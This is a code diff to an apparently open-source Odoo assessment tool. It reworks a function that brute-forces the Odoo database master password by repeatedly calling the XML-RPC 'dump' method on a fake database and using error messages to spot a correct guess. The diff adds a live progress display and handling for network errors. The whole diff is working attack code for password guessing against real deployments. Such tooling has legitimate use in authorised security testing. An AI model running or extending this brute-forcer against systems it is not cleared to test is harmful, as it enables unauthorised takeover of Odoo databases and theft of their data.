@@ -1,8 +1,10 @@
 import os
 import sys
 from importlib.resources import files
+from pathlib import Path
 from odoomap.colors import Colors
 import xmlrpc.client
+from .brute_display import BruteDisplay, console
 
 directory = os.getcwd()      
 
@@ -269,7 +271,7 @@ def bruteforce_master_password(connection, wordlist_file=None):
     Attempt to bruteforce the Odoo database master password.
     This works by trying to dump an unexisting database with each password.
     Even if the password is correct, it will raise an exception about unspecified
-    format, so I checked for the specific error message to confirm success.
+    format, so we check for specific error messages to confirm success.
     """
 
     passwords = []
@@ -281,26 +283,33 @@ def bruteforce_master_password(connection, wordlist_file=None):
             print(f"{Colors.s} Loaded {len(passwords)} passwords from {wordlist_file}")
         except Exception as e:
             print(f"{Colors.e} Error reading wordlist file: {e}")
-            return None  # Exit if the wordlist can't be read
+            return None
 
     if not passwords:
         print(f"{Colors.e} Please provide a passwords file with -p <file>.")
         return None
 
-    # Try each password
-    for pwd in passwords:
-        try:
-            proxy = connection.master  
+    display = BruteDisplay(total=len(passwords))
 
-            # Use `dump` as it requires correct master password
-            proxy.dump(pwd, 'fake_db_73189')
-            
-            # If no exception: password is valid
+    for pwd in passwords:
+        display.update(f"{Colors.t} {pwd}")
+        try:
+            proxy = connection.master
+            proxy.dump(pwd, "fake_db_73189")
+            display.add_success(pwd)
+            display.stop()
             return pwd
+
+        except (ConnectionRefusedError, TimeoutError, OSError) as net_err:
+            display.add_error(f"{net_err}")
+
         except Exception as e:
             if "Fault 3:" in str(e) or "Access Denied" in str(e) or "Wrong master password" in str(e):
-                print(f"{Colors.i} Tried: {pwd} (incorrect)")
+                pass
             else:
-                print(f"{Colors.s} SUCCESS: Master password is '{pwd}'")
+                display.add_success(pwd)
+                display.stop()
                 return pwd
+
+    display.stop()
     return None
